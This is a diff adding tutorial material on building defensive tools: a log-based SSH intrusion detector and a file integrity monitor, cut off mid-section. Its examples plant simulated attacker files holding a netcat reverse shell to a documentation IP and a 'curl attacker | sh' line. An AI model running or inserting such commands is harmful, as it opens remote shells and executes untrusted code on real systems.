@@ -1,0 +1,1136 @@
+=== S1.1
+@idea
+This portfolio project is a **log-based intrusion detector** for your own servers, in the spirit of Fail2ban: it reads authentication and web logs, spots suspicious patterns and raises alerts. It is defensive security work that hiring managers recognise immediately, and it exercises parsing, time windows, configuration, testing and packaging.
+
+Planning starts with **what to flag**. Pick a few patterns you can describe precisely and that matter on a real machine: many failed SSH logins from one IP in a short window (brute force), logins attempted for many different usernames from one IP (user enumeration), a successful login right after a burst of failures (a guess that worked), and in web logs, requests for paths like `/wp-admin` or `/.env` on a site that has neither (scanners). For each, write the rule in one sentence with its threshold: "5 failures from one IP within 60 seconds".
+
+Then collect **sample logs**: lines from your own `/var/log/auth.log` (anonymise addresses), plus hand-written lines that trigger each rule and lines that should *not* trigger anything. These become your test fixtures. Finally, set up a clean repository from day one: src layout, `pyproject.toml`, a README skeleton stating the rules, and a first passing test, so CI can run from the first commit.
+@how
+- Write each rule as one sentence with a threshold and a time window.
+- Collect real and synthetic sample lines; include negatives that must not alert.
+- Anonymise real logs: replace IPs with documentation ranges (203.0.113.x, 198.51.100.x).
+- Repository: `src/intrusion_watch/`, `tests/`, `tests/data/`, `pyproject.toml`, README, LICENSE.
+- First test: parsing one known line gives the expected fields.
+@example python: Recognising the event types in an auth log
+import re
+
+PATTERNS = {
+    "failed": re.compile(r"Failed password for (?:invalid user )?(?P<user>\S+) from (?P<ip>[\d.]+) port \d+"),
+    "accepted": re.compile(r"Accepted (?:password|publickey) for (?P<user>\S+) from (?P<ip>[\d.]+) port \d+"),
+    "invalid_user": re.compile(r"Invalid user (?P<user>\S+) from (?P<ip>[\d.]+)"),
+}
+
+sample = """Nov 20 09:14:01 web1 sshd[811]: Invalid user admin from 203.0.113.9 port 50122
+Nov 20 09:14:02 web1 sshd[811]: Failed password for invalid user admin from 203.0.113.9 port 50122 ssh2
+Nov 20 09:14:05 web1 sshd[812]: Failed password for root from 203.0.113.9 port 50130 ssh2
+Nov 20 09:20:44 web1 sshd[901]: Accepted publickey for kev from 198.51.100.4 port 61001 ssh2
+Nov 20 09:21:00 web1 CRON[950]: (root) CMD (run-parts /etc/cron.hourly)"""
+
+for line in sample.splitlines():
+    for kind, pattern in PATTERNS.items():
+        if m := pattern.search(line):
+            print(f"{line[:15]}  {kind:12} user={m['user']:6} ip={m['ip']}")
+            break
+    else:
+        print(f"{line[:15]}  (ignored)")
+@note
+Each event type gets one named-group pattern, and lines that match nothing (the cron job) are explicitly ignored rather than causing errors. The "invalid user" form of a failed password is folded into the same pattern with an optional group. These sample lines go straight into `tests/data/` as fixtures.
+@example text: The rules, written before the code
+# README: Detection rules (v1)
+
+| Rule            | Fires when                                              | Default        |
+|-----------------|---------------------------------------------------------|----------------|
+| brute-force     | >= 5 failed logins from one IP within 60 s              | 5 / 60 s       |
+| user-enum       | >= 4 distinct usernames tried from one IP within 300 s  | 4 / 300 s      |
+| guess-succeeded | a successful login from an IP with >= 3 recent failures | 3 / 600 s      |
+| web-scanner     | >= 3 requests for known probe paths from one IP         | 3 / 120 s      |
+
+Must NOT fire on:
+- one user mistyping a password twice, then logging in
+- cron, systemd and other non-auth lines
+- a monitoring service hitting /health every 10 s
+
+Thresholds are read from config.toml, never hard-coded.
+@note
+Writing the rules as a table with thresholds, plus explicit cases that must not fire, gives you the specification and the test plan at once. The "must not fire" list is what keeps false positives low, which is what decides whether anyone would actually run the tool.
+@mistakes
+- **Vague rules** like "detect attacks". Write precise rules with thresholds and windows.
+- **Only positive samples.** Without negatives you cannot measure false positives.
+- **Committing real IP addresses or usernames.** Anonymise sample logs.
+@keys
+- Choose a few precise rules with thresholds and time windows.
+- Collect sample logs, including lines that must not alert.
+- Set up the repository, README and a first test from day one.
+- The rules table doubles as specification and test plan.
+
+=== S1.2
+@idea
+The detector's core turns raw lines into **typed events**, then applies **rules over sliding time windows**. Parsing first: a small dataclass `Event(time, kind, ip, user)` produced by one function, `parse(line) -> Event | None`. Everything downstream works on events, never on raw text, so rules are easy to test and a new log format only needs a new parser.
+
+Auth logs omit the year (`Nov 20 09:14:01`), so supply it from the file date or the current year, and handle the December-to-January rollover. Make timestamps timezone-aware if you will compare with other sources.
+
+A **sliding window** answers "how many failures from this IP in the last 60 seconds?". Keep, per IP, a `deque` of recent failure times: append each new one, pop from the left while the oldest is older than the window, and compare the length with the threshold. Each event is added and removed once, so this is O(1) amortised per event and memory stays bounded. To avoid alert floods, a rule fires once and then stays quiet for that IP for a **cooldown** period.
+
+Thresholds and windows belong in a **config file** (TOML, read with `tomllib`), validated at start-up, so the same code can be strict on a public server and relaxed at home.
+@how
+- `@dataclass(frozen=True) class Event: time: datetime; kind: str; ip: str; user: str`.
+- `parse(line, year)` returns an Event or None; never raise on odd lines.
+- Per-key `defaultdict(deque)`; append, evict old entries from the left, compare with the threshold.
+- Cooldown: remember the last alert time per (rule, ip).
+- Read thresholds with `tomllib`; validate types and ranges at start-up.
+@example python: A sliding-window rule with a cooldown
+from collections import defaultdict, deque
+from dataclasses import dataclass
+from datetime import datetime, timedelta
+
+@dataclass(frozen=True)
+class Event:
+    time: datetime
+    kind: str
+    ip: str
+
+class BruteForceRule:
+    def __init__(self, threshold=5, window=60, cooldown=300):
+        self.threshold, self.window, self.cooldown = threshold, timedelta(seconds=window), timedelta(seconds=cooldown)
+        self.recent = defaultdict(deque)
+        self.last_alert = {}
+
+    def feed(self, event):
+        if event.kind != "failed":
+            return None
+        times = self.recent[event.ip]
+        times.append(event.time)
+        while times and event.time - times[0] > self.window:
+            times.popleft()
+        if len(times) >= self.threshold:
+            last = self.last_alert.get(event.ip)
+            if last is None or event.time - last > self.cooldown:
+                self.last_alert[event.ip] = event.time
+                return f"{event.time:%H:%M:%S} brute-force from {event.ip}: {len(times)} failures in {self.window.seconds}s"
+        return None
+
+t0 = datetime(2026, 11, 20, 9, 0, 0)
+events = [Event(t0 + timedelta(seconds=s), "failed", "203.0.113.9") for s in (0, 5, 9, 14, 18, 22, 25)]
+events += [Event(t0 + timedelta(seconds=s), "failed", "198.51.100.4") for s in (0, 70, 140)]   # slow, spread out
+events += [Event(t0 + timedelta(seconds=400), "failed", "203.0.113.9") for _ in range(5)]      # back after cooldown
+rule = BruteForceRule()
+for e in sorted(events, key=lambda e: e.time):
+    if alert := rule.feed(e):
+        print(alert)
+@note
+The fast attacker triggered one alert at the fifth failure; the sixth and seventh were suppressed by the cooldown. The slow IP never had five failures inside any 60-second window, so it never fired. After the cooldown, a new burst raised a fresh alert.
+@example python: Parsing with the missing year, and thresholds from TOML
+import tomllib
+from datetime import datetime
+
+CONFIG = """
+[brute_force]
+threshold = 5
+window_seconds = 60
+
+[user_enum]
+threshold = "four"
+window_seconds = 300
+"""
+
+def load_rules(text):
+    config, errors = tomllib.loads(text), []
+    for name, rule in config.items():
+        for key in ("threshold", "window_seconds"):
+            value = rule.get(key)
+            if not isinstance(value, int) or value <= 0:
+                errors.append(f"[{name}] {key} must be a positive integer, got {value!r}")
+    if errors:
+        raise ValueError("; ".join(errors))
+    return config
+
+try:
+    load_rules(CONFIG)
+except ValueError as error:
+    print("config error:", error)
+
+def parse_time(stamp, file_year, file_month):
+    t = datetime.strptime(f"{file_year} {stamp}", "%Y %b %d %H:%M:%S")
+    if t.month == 12 and file_month == 1:          # December lines in a January file
+        t = t.replace(year=file_year - 1)
+    return t
+
+print(parse_time("Nov 20 09:14:01", 2026, 11))
+print(parse_time("Dec 31 23:59:58", 2027, 1))
+@note
+A typo in the configuration is caught at start-up with a message naming the section and key, instead of the detector silently never firing. The parser supplies the year that syslog omits, and moves December lines found in a January file back one year.
+@mistakes
+- **Rules that read raw text.** Every format change breaks every rule. Parse into events once.
+- **Counting failures since the start of the file.** Use a time window, or every IP eventually looks like an attacker.
+- **Alerting on every event past the threshold.** Floods hide real problems. Add a cooldown.
+@keys
+- Parse lines into typed events; rules work only on events.
+- Sliding windows with a deque per IP: bounded memory, O(1) per event.
+- Cooldowns prevent alert floods.
+- Thresholds in a validated TOML config.
+
+=== S1.3
+@idea
+A detector earns its keep by running **continuously**: following the log as new lines are written, like `tail -f`. The basic loop opens the file, seeks to the end, and repeatedly reads any new complete lines, sleeping briefly when there are none. Keep partial lines in a buffer until their newline arrives.
+
+Logs are **rotated**: at some point `app.log` is renamed to `app.log.1` and a fresh, empty `app.log` is created (or the file is truncated in place). A naive follower keeps reading the old renamed file forever and misses everything new. Detect rotation by comparing the file's **inode** (`os.stat(path).st_ino`) with the one you opened, and notice truncation when the file becomes smaller than your read position; in both cases reopen and start from the beginning of the new file.
+
+Alerts go to the console and to a **webhook** (an HTTP POST of JSON to Slack, Discord, ntfy or your own endpoint). Network calls fail, so send with a timeout and never let a failed webhook crash the detector: log the error and carry on. Combined with the per-rule cooldown, the result is one clear message per incident instead of a stream every second.
+@how
+- Open, `seek(0, os.SEEK_END)`, loop: read new lines, buffer partial ones, sleep 0.5–1 s when idle.
+- Rotation: `os.stat(path).st_ino != current_inode` → reopen; truncation: size < position → seek to 0.
+- Handle the file briefly not existing during rotation.
+- Webhook: `requests.post(url, json=payload, timeout=5)`; catch and log failures.
+- Test the follower with a temporary file you write to, rename and truncate.
+@example python: A follower that survives rotation and truncation
+import os
+from pathlib import Path
+
+class Follower:
+    def __init__(self, path):
+        self.path = Path(path)
+        self._open(at_end=True)
+
+    def _open(self, at_end=False):
+        self.f = open(self.path, encoding="utf-8")
+        self.inode = os.fstat(self.f.fileno()).st_ino
+        if at_end:
+            self.f.seek(0, os.SEEK_END)
+        self.buffer = ""
+
+    def poll(self):
+        try:
+            st = os.stat(self.path)
+        except FileNotFoundError:
+            return []                                    # mid-rotation: try again later
+        lines = []
+        if st.st_ino != self.inode:                      # rotated: drain the old file, then switch
+            lines += self._read()
+            self.f.close()
+            self._open()
+        elif st.st_size < self.f.tell():                 # truncated in place
+            self.f.seek(0)
+            self.buffer = ""
+        return lines + self._read()
+
+    def _read(self):
+        self.buffer += self.f.read()
+        *complete, self.buffer = self.buffer.split("\n")
+        return complete
+
+log = Path("app.log")
+log.write_text("old line before we started\n")
+watch = Follower(log)
+with open(log, "a") as f:
+    f.write("one\ntwo\nthr")
+print("poll 1:", watch.poll())
+with open(log, "a") as f:
+    f.write("ee\nlast line of old file\n")
+os.rename(log, "app.log.1")
+log.write_text("first line after rotation\n")
+print("poll 2:", watch.poll())
+log.write_text("")                                       # truncate
+with open(log, "a") as f:
+    f.write("after truncation\n")
+print("poll 3:", watch.poll())
+@note
+The follower started at the end, so the old line was skipped. "thr" waited in the buffer until its newline arrived. After rotation it drained the last line of the renamed file before switching to the new one by inode, and after truncation it started again from the top. No line was lost or repeated.
+@example python: Alerts to a webhook that never crash the detector
+import json
+import threading
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+
+import requests
+
+received = []
+
+class Hook(BaseHTTPRequestHandler):
+    def do_POST(self):
+        received.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
+        self.send_response(204)
+        self.end_headers()
+    def log_message(self, *args):
+        pass
+
+server = ThreadingHTTPServer(("127.0.0.1", 0), Hook)
+threading.Thread(target=server.serve_forever, daemon=True).start()
+
+def send_alert(url, rule, ip, detail):
+    payload = {"text": f"[intrusion-watch] {rule} from {ip}: {detail}"}
+    print("console:", payload["text"])
+    try:
+        requests.post(url, json=payload, timeout=3).raise_for_status()
+    except requests.RequestException as error:
+        print("  webhook failed, detector keeps running:", type(error).__name__)
+
+send_alert(f"http://127.0.0.1:{server.server_address[1]}/hook", "brute-force", "203.0.113.9", "6 failures in 60s")
+send_alert("http://127.0.0.1:9/hook", "user-enum", "198.51.100.4", "5 usernames in 300s")
+print("webhook received:", received)
+server.shutdown()
+@note
+The first alert reached the local stand-in webhook as JSON. The second endpoint was unreachable; the error was reported and swallowed, so a chat-service outage can never stop the detector from watching. The console line is always printed first, so nothing is lost.
+@mistakes
+- **Reading the whole file every second.** Wasteful and re-alerts old events. Track your position.
+- **Ignoring rotation.** The detector silently watches an old file. Compare inodes.
+- **Letting a webhook error crash the loop.** Catch, log and continue.
+@keys
+- Follow the file from its end, buffering partial lines.
+- Detect rotation by inode and truncation by size; reopen and continue.
+- Alerts to console and webhook with timeouts; failures never stop the detector.
+- Cooldowns turn incidents into one message each.
+
+=== S1.4
+@idea
+Portfolio polish makes the project understandable in two minutes and trustworthy in five. A reviewer should see what it does, that it works, and that you build software carefully.
+
+**Tests on sample logs** are the strongest evidence. Keep realistic log files in `tests/data/` and write end-to-end tests that run the whole pipeline (parse, rules, alerts collected in a list) and assert exactly which alerts fire, including the "must not fire" cases. Parametrize over the samples so adding a new scenario is one file and one table row. Add focused unit tests for tricky parts: the year rollover, the window boundary, rotation.
+
+**CI** runs Ruff, mypy and pytest on every push, with the badge in the README. The **README** leads with a one-sentence pitch, a small architecture diagram (log → follower → parser → rules → alerts), an animated GIF or a block of real demo output, installation, configuration, the rules table, and the limitations (it reads logs after the fact, it does not block attackers by itself unless wired to a firewall). Finally, write **CV bullets** that name the problem, the techniques and a measurable result: "Built a log-based intrusion detector in Python (sliding-window rules, rotation-safe file following, webhook alerts); 40 tests, 0 false positives on two weeks of real auth logs."
+@how
+- `tests/data/*.log` scenarios, each with expected alerts; one parametrized end-to-end test.
+- Unit tests for boundaries: exactly-threshold, window edge, year rollover, rotation.
+- CI: ruff, mypy --strict, pytest --cov; badge in README.
+- README: pitch, diagram, demo output, install, config, rules, limitations.
+- CV bullets: problem + techniques + measurable result.
+@example python: End-to-end scenarios as a parametrized test
+import contextlib, io, re
+import pytest
+from pathlib import Path
+
+data = Path("scenarios")
+data.mkdir(exist_ok=True)
+(data / "brute_force.log").write_text("".join(
+    f"Nov 20 09:00:{s:02d} web1 sshd[1]: Failed password for root from 203.0.113.9 port 5{s} ssh2\n" for s in range(0, 30, 5)))
+(data / "typo_then_login.log").write_text(
+    "Nov 20 09:00:00 web1 sshd[2]: Failed password for kev from 198.51.100.4 port 1 ssh2\n"
+    "Nov 20 09:00:04 web1 sshd[2]: Failed password for kev from 198.51.100.4 port 2 ssh2\n"
+    "Nov 20 09:00:09 web1 sshd[2]: Accepted password for kev from 198.51.100.4 port 3 ssh2\n")
+(data / "noise.log").write_text("Nov 20 09:00:00 web1 CRON[9]: (root) CMD (backup)\n" * 50)
+
+Path("test_scenarios.py").write_text('''
+import re
+from collections import defaultdict, deque
+from datetime import datetime
+from pathlib import Path
+import pytest
+
+FAILED = re.compile(r"^(\\w{3} \\d+ [\\d:]+) .*Failed password for (?:invalid user )?\\S+ from ([\\d.]+)")
+
+def detect(lines, threshold=5, window=60):
+    recent, alerts = defaultdict(deque), []
+    for line in lines:
+        if m := FAILED.search(line):
+            t = datetime.strptime("2026 " + m[1], "%Y %b %d %H:%M:%S")
+            q = recent[m[2]]
+            q.append(t)
+            while (t - q[0]).seconds > window:
+                q.popleft()
+            if len(q) == threshold:
+                alerts.append(("brute-force", m[2]))
+    return alerts
+
+@pytest.mark.parametrize("scenario, expected", [
+    ("brute_force.log", [("brute-force", "203.0.113.9")]),
+    ("typo_then_login.log", []),
+    ("noise.log", []),
+])
+def test_scenario(scenario, expected):
+    lines = (Path("scenarios") / scenario).read_text().splitlines()
+    assert detect(lines) == expected
+''')
+out = io.StringIO()
+with contextlib.redirect_stdout(out):
+    pytest.main(["-v", "-p", "no:cacheprovider", "test_scenarios.py"])
+for line in out.getvalue().splitlines():
+    if "PASSED" in line or "FAILED" in line:
+        print(re.sub(r"\s+\[\s*\d+%\]", "", line).replace("test_scenarios.py::", ""))
+@note
+Each scenario is a realistic log file with the exact alerts it should produce, and the "typo then login" and "noise" cases prove the detector stays quiet when it should. Adding a scenario means one log file and one table row. These tests are also what you point to in an interview.
+@example text: README opening and CV bullets
+# intrusion-watch  ![CI](https://github.com/you/intrusion-watch/actions/workflows/ci.yml/badge.svg)
+
+Watches your server's auth and web logs and alerts you to brute-force
+logins, user enumeration and scanners, within seconds.
+
+    auth.log ──► follower ──► parser ──► rules (sliding windows) ──► alerts
+    (rotation-safe)           (typed events)  (config.toml)        console / webhook
+
+    $ intrusion-watch --config config.toml /var/log/auth.log
+    09:00:20 brute-force  203.0.113.9   5 failures in 60s
+    09:04:11 user-enum    198.51.100.7  6 usernames in 300s (admin, test, oracle, ...)
+
+Limitations: detects after the fact from logs; pair with a firewall rule
+or fail2ban action to block. IPv6 parsing is basic.
+
+---
+CV bullets
+- Built a rotation-safe, log-based intrusion detector in Python with
+  sliding-window rules, TOML configuration and webhook alerts.
+- Wrote 40 tests including end-to-end log scenarios; zero false positives
+  on two weeks of real auth logs; CI with ruff, mypy --strict and pytest.
+@note
+The README shows what it does in one sentence, how it works in one diagram, and what it looks like in real output, then admits its limits. The CV bullets name the techniques and a measurable outcome, which is what distinguishes them from "made a security tool".
+@mistakes
+- **Tests only for helper functions.** Add end-to-end scenarios on realistic logs.
+- **A README without demo output.** Readers cannot picture it. Show real output.
+- **CV bullets without results.** Add numbers: tests, false positives, speed.
+@keys
+- End-to-end scenario tests on sample logs, including must-not-fire cases.
+- CI with lint, types and tests; badge in README.
+- README: pitch, diagram, demo output, config, limitations.
+- CV bullets name the problem, techniques and measurable results.
+
+=== S2.1
+@idea
+The second security project is a **file integrity monitor** (FIM), like a small Tripwire or AIDE: it records the state of protected files, then detects any change, addition or deletion. Integrity monitoring is a standard control in security frameworks (PCI DSS, CIS benchmarks), because attackers who gain access usually modify something: a config file, a binary, an authorised SSH key.
+
+Planning means deciding **what to protect** and **what counts as a change**. Good candidates are configuration (`/etc/ssh/sshd_config`, `/etc/sudoers`, web server configs), startup scripts, `~/.ssh/authorized_keys`, and your own application's code. For each file, a change can be in its **content** (detected by a cryptographic hash), its **permissions**, its **owner**, or its existence (new or deleted files). Some paths change legitimately and constantly (logs, caches, `.pyc` files), so a policy needs **exclusions**.
+
+Write the policy as a TOML file: the paths to watch, whether to recurse, the exclusion patterns, and where the baseline is stored. Reading it with `tomllib` and validating it at start-up gives clear errors for typos. Set up the repository as before: src layout, tests from the first day, README with the threat model ("what this detects, what it does not").
+@how
+- List protected paths and why each matters.
+- Change types: content (hash), mode, owner, new file, deleted file.
+- Exclusions with glob patterns (`*.log`, `__pycache__/*`).
+- Policy in TOML: `[[watch]]` entries with `path`, `recursive`, `exclude`.
+- README threat model: what it detects, what it cannot (an attacker with root can also edit the baseline).
+@example python: A validated TOML policy and exclusion matching
+import fnmatch
+import tomllib
+from pathlib import PurePosixPath
+
+POLICY = """
+baseline = "baseline.json"
+
+[[watch]]
+path = "/etc/ssh"
+recursive = true
+exclude = ["*.bak", "moduli"]
+
+[[watch]]
+path = "/home/kev/.ssh/authorized_keys"
+
+[[watch]]
+path = "/srv/app"
+recursive = true
+exclude = ["__pycache__/*", "*.pyc", "logs/*"]
+"""
+
+policy = tomllib.loads(POLICY)
+for entry in policy["watch"]:
+    entry.setdefault("recursive", False)
+    entry.setdefault("exclude", [])
+print(len(policy["watch"]), "watched paths; baseline at", policy["baseline"])
+
+def excluded(path, root, patterns):
+    rel = PurePosixPath(path).relative_to(root).as_posix()
+    return any(fnmatch.fnmatch(rel, p) or fnmatch.fnmatch(PurePosixPath(rel).name, p) for p in patterns)
+
+app = policy["watch"][2]
+for p in ["/srv/app/main.py", "/srv/app/__pycache__/main.cpython-312.pyc", "/srv/app/logs/today.log", "/srv/app/config/settings.toml"]:
+    print(f"{p:45} {'excluded' if excluded(p, app['path'], app['exclude']) else 'watched'}")
+@note
+`tomllib` parses the policy into dictionaries, and defaults are filled in for optional keys. Exclusion patterns are matched against both the path relative to the watched folder and the bare file name, so `*.pyc` and `logs/*` behave as a reader would expect.
+@example python: Which metadata reveals which kind of change
+import os
+import stat
+import tempfile
+from pathlib import Path
+
+folder = Path(tempfile.mkdtemp())
+f = folder / "sshd_config"
+f.write_text("PermitRootLogin  no\n")
+
+def snapshot(path):
+    st = path.stat()
+    return {"size": st.st_size, "mode": stat.filemode(st.st_mode), "uid": st.st_uid, "mtime_ns": st.st_mtime_ns}
+
+before = snapshot(f)
+f.chmod(0o666)                                         # someone loosens permissions
+after_chmod = snapshot(f)
+original_mtime = after_chmod["mtime_ns"]
+f.write_text("PermitRootLogin yes\n")                  # same size, different content
+os.utime(f, ns=(original_mtime, original_mtime))       # and resets the timestamp to hide it
+after_edit = snapshot(f)
+
+print("mode change visible:", before["mode"], "->", after_chmod["mode"])
+print("edit visible in size or mtime:", after_edit["size"] != after_chmod["size"] or after_edit["mtime_ns"] != original_mtime)
+print("-> metadata alone is not enough; content needs a hash")
+@note
+Permission changes show up in the mode, but the content edit kept the same size, and the timestamp was set back to hide it, so size and modification time saw nothing. That is why integrity monitors hash file contents: an attacker can fake metadata, not a SHA-256.
+@mistakes
+- **Watching everything.** Logs and caches drown real changes in noise. Choose paths and exclusions deliberately.
+- **Trusting size and modification time.** Both can be faked. Hash the content.
+- **No stated threat model.** Readers overestimate what the tool protects against.
+@keys
+- A FIM detects content, permission, owner, new and deleted changes.
+- Choose protected paths with reasons; exclude noisy ones.
+- A validated TOML policy describes what to watch.
+- Hash contents: metadata can be forged.
+
+=== S2.2
+@idea
+The core of the monitor is two operations: **build a baseline** (scan the protected files and record each one's hash and metadata) and **compare** a fresh scan against it. The baseline is a JSON file mapping each path to its SHA-256 digest, size, mode, owner and modification time.
+
+Hash files **in chunks** (`while chunk := f.read(65536): h.update(chunk)`), so a multi-gigabyte file never has to fit in memory; Python 3.11+ offers `hashlib.file_digest(f, "sha256")` that does this for you. Use SHA-256 (MD5 and SHA-1 are broken for integrity purposes). Handle files that cannot be read (permissions) or vanish mid-scan by recording an error instead of crashing.
+
+Comparing two scans is set arithmetic on the paths: in the new scan but not the baseline → **added**; in the baseline but not the new scan → **deleted**; in both → compare fields and report which changed: **content** (hash), **mode**, **owner**. Report each change with the old and new values. When comparing secret-derived values such as HMACs, use `hmac.compare_digest`, which takes the same time whatever the input, so timing cannot leak information. The baseline itself is a target: store it somewhere the monitored host cannot silently modify, or sign it with an HMAC.
+@how
+- Walk with `Path.rglob("*")`, skipping excluded paths and non-files.
+- `hashlib.file_digest(f, "sha256").hexdigest()` (or a chunked loop).
+- Record `{"sha256", "size", "mode", "uid", "mtime"}` per path; save JSON sorted by path.
+- Compare: added = new − old, deleted = old − new, changed = fields that differ.
+- Protect the baseline: read-only storage elsewhere, or an HMAC signature checked with `compare_digest`.
+@example python: Scan, save a baseline, change things, compare
+import hashlib
+import json
+import stat
+import tempfile
+from pathlib import Path
+
+root = Path(tempfile.mkdtemp())
+for name, text in {"sshd_config": "PermitRootLogin no\n", "sudoers": "kev ALL=(ALL) ALL\n", "motd": "Welcome\n"}.items():
+    (root / name).write_text(text)
+
+def scan(folder):
+    result = {}
+    for path in sorted(folder.rglob("*")):
+        if path.is_file():
+            with open(path, "rb") as f:
+                digest = hashlib.file_digest(f, "sha256").hexdigest()
+            st = path.stat()
+            result[path.relative_to(folder).as_posix()] = {"sha256": digest, "mode": stat.filemode(st.st_mode), "size": st.st_size}
+    return result
+
+def compare(old, new):
+    report = [f"ADDED    {p}" for p in sorted(new.keys() - old.keys())]
+    report += [f"DELETED  {p}" for p in sorted(old.keys() - new.keys())]
+    for p in sorted(old.keys() & new.keys()):
+        for field in ("sha256", "mode"):
+            if old[p][field] != new[p][field]:
+                a, b = old[p][field], new[p][field]
+                report.append(f"CHANGED  {p}: {field} {a[:12]} -> {b[:12]}")
+    return report
+
+baseline_file = Path("baseline.json")
+baseline_file.write_text(json.dumps(scan(root), indent=1, sort_keys=True))
+
+(root / "sshd_config").write_text("PermitRootLogin yes\n")
+(root / "sudoers").chmod(0o666)
+(root / "motd").unlink()
+(root / "backdoor.sh").write_text("nc -e /bin/sh 203.0.113.9 4444\n")
+
+for line in compare(json.loads(baseline_file.read_text()), scan(root)):
+    print(line)
+@note
+One comparison caught all four kinds of change: the edited SSH config (new hash), loosened permissions on sudoers, the deleted motd and the unexpected new script. Set operations on the path names give additions and deletions directly; field comparisons give the rest.
+@example python: Chunked hashing, and signing the baseline
+import hashlib
+import hmac
+import json
+from pathlib import Path
+
+big = Path("big.bin")
+with open(big, "wb") as f:
+    for i in range(50):
+        f.write(bytes([i % 256]) * 1_000_000)          # 50 MB, written in pieces
+
+h = hashlib.sha256()
+with open(big, "rb") as f:
+    while chunk := f.read(1 << 16):                    # 64 KiB at a time: memory stays small
+        h.update(chunk)
+with open(big, "rb") as f:
+    same = hashlib.file_digest(f, "sha256").hexdigest() == h.hexdigest()
+print("chunked digest matches file_digest:", same)
+
+KEY = b"kept-off-the-monitored-host"
+baseline = json.dumps({"sshd_config": "9f86d0..."}, sort_keys=True).encode()
+signature = hmac.new(KEY, baseline, "sha256").hexdigest()
+
+tampered = baseline.replace(b"9f86d0", b"000000")
+for label, data in [("original", baseline), ("tampered", tampered)]:
+    ok = hmac.compare_digest(hmac.new(KEY, data, "sha256").hexdigest(), signature)
+    print(f"{label} baseline signature valid: {ok}")
+@note
+Reading 64 KiB at a time hashed a 50 MB file without loading it, and matched `file_digest`. An HMAC signature computed with a key kept off the host lets the monitor detect a baseline someone edited to hide their change; `compare_digest` checks it in constant time.
+@mistakes
+- **Reading whole files to hash them.** Large files exhaust memory. Hash in chunks.
+- **MD5 or SHA-1 for integrity.** Both have practical collisions. Use SHA-256.
+- **Leaving the baseline writable by whoever you are watching.** Store it elsewhere or sign it.
+@keys
+- Baseline = path → hash and metadata, saved as sorted JSON.
+- Hash in chunks with SHA-256 (`hashlib.file_digest`).
+- Compare with set operations plus per-field checks.
+- Protect the baseline: separate storage or an HMAC with `compare_digest`.
+
+=== S2.3
+@idea
+A scheduled scan (every hour, via cron or a systemd timer) catches changes eventually; **real-time** monitoring catches them within seconds. Operating systems can notify a program when files change: inotify on Linux, FSEvents on macOS, ReadDirectoryChangesW on Windows. The `watchdog` library wraps all three behind one interface: an `Observer` watches folders and calls your handler's `on_created`, `on_modified`, `on_deleted` and `on_moved` methods.
+
+Raw events are noisy. Saving one file in an editor can produce a burst: create a temporary file, write it several times, rename it over the original. Reacting to each event would re-hash the file five times and send five alerts. **Debouncing** solves it: record the time of the latest event per path, and only process a path once it has been quiet for a short period (say half a second). Then hash it and compare with the baseline, so a file that was saved without real changes produces nothing.
+
+Finally, **reports**. Collect changes into a readable summary: grouped by severity (a changed `sudoers` matters more than a changed `motd`), with old and new values, timestamps and the host name, written as text for people and JSON for other tools. Keep a scheduled full scan alongside real-time events, because notifications can be missed (buffer overflows, the monitor being down).
+@how
+- `watchdog`: `Observer().schedule(handler, path, recursive=True)`, `observer.start()`.
+- Debounce: `last_event[path] = now`; process paths quiet for ≥ 0.5 s.
+- After debouncing, re-hash and compare with the baseline; ignore no-op saves.
+- Severity from the policy (critical paths list); group the report by severity.
+- Keep a periodic full scan as a safety net.
+@example python: Debouncing a burst of editor events
+QUIET = 5                                    # tenths of a second
+
+events = [                                   # (time in tenths, path, event)
+    (0, "sshd_config.swp", "created"), (1, "sshd_config.swp", "modified"), (2, "sshd_config.swp", "modified"),
+    (3, "sshd_config", "moved_to"), (3, "sshd_config.swp", "deleted"),
+    (20, "sudoers", "modified"), (22, "sudoers", "modified"), (24, "sudoers", "modified"),
+    (40, "motd", "modified"),
+]
+
+last_seen, processed = {}, []
+def tick(now):
+    for path, t in sorted(last_seen.items()):
+        if now - t >= QUIET:
+            processed.append((now, path))
+            del last_seen[path]
+
+i = 0
+for now in range(0, 60):
+    while i < len(events) and events[i][0] == now:
+        _, path, kind = events[i]
+        if not path.endswith(".swp"):        # editor temp files are ignored by policy
+            last_seen[path] = now
+        i += 1
+    tick(now)
+
+print(f"{len(events)} raw events -> {len(processed)} checks:")
+for now, path in processed:
+    print(f"  at {now / 10:.1f}s check {path}")
+@note
+Nine raw events collapsed into three checks: the editor's temporary-file dance became one check of `sshd_config`, and three quick writes to `sudoers` became one. Each check happens half a second after the last event for that path, when the file has settled.
+@example python: Real-time watching by polling, with the same debounced logic
+import hashlib
+import tempfile
+import threading
+import time
+from pathlib import Path
+
+folder = Path(tempfile.mkdtemp())
+(folder / "sudoers").write_text("kev ALL=(ALL) ALL\n")
+
+def digest(p):
+    return hashlib.sha256(p.read_bytes()).hexdigest() if p.exists() else None
+
+baseline = {p.name: digest(p) for p in folder.iterdir()}
+alerts = []
+
+def watcher(stop):
+    seen = {p.name: p.stat().st_mtime_ns for p in folder.iterdir()}
+    pending = {}
+    while not stop.is_set():
+        current = {p.name: p.stat().st_mtime_ns for p in folder.iterdir()}
+        for name in sorted(current.keys() | seen.keys()):
+            if current.get(name) != seen.get(name):
+                pending[name] = time.monotonic()
+        seen = current
+        for name, t in list(pending.items()):
+            if time.monotonic() - t >= 0.3:
+                del pending[name]
+                new = digest(folder / name)
+                if new != baseline.get(name):
+                    alerts.append(f"{name}: {'deleted' if new is None else 'added' if name not in baseline else 'content changed'}")
+                    baseline[name] = new
+        time.sleep(0.05)
+
+stop = threading.Event()
+thread = threading.Thread(target=watcher, args=(stop,), daemon=True)
+thread.start()
+time.sleep(0.2)
+for text in ["kev ALL=(ALL) ALL\n", "kev ALL=(ALL) ALL\n"]:      # saved twice, no real change
+    (folder / "sudoers").write_text(text); time.sleep(0.05)
+time.sleep(0.5)
+(folder / "sudoers").write_text("kev ALL=(ALL) NOPASSWD: ALL\n")
+(folder / "evil.sh").write_text("curl attacker | sh\n")
+time.sleep(0.8)
+stop.set(); thread.join()
+print(sorted(alerts))
+@note
+This stands in for watchdog with simple polling so it runs anywhere, but the logic is the same: changes go into a pending map, are processed after a quiet period, and are compared by hash. Saving the file twice without changing it produced no alert; the real escalation and the new script each produced exactly one.
+@mistakes
+- **Alerting on every raw event.** One save becomes five alerts. Debounce.
+- **Trusting events alone.** A changed timestamp is not a changed file. Re-hash after debouncing.
